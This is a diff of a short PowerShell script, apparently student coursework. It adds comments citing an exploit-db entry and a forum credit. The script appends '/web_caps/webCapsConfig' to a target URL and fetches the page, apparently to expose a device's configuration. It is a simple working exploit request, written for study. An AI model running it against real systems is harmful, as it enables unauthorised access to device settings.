@@ -28,6 +28,7 @@ Student ID: PSP-3223
 param ([parameter (Mandatory = $true)][string]$URL)
 
 #exploit
+#https://www.exploit-db.com/exploits/44734
 $exploit = "/web_caps/webCapsConfig"
 
 #set the full URL with Exploit 
@@ -35,7 +36,7 @@ $infected_website_URL = $URL + $exploit
 
 
 #EXPLOITING
-
+#credit: https://social.technet.microsoft.com/Forums/en-US/e54555bd-00bb-4ef9-9cb0-177644ba19e2/how-to-open-url-through-powershell?forum=winserverpowershell
 # Get the content of the infected page to see the result 
 write-host $infected_website_URL -ForegroundColor Yellow
 $output = Invoke-WebRequest -Uri $infected_website_URL  | Select-Object -ExpandProperty Content
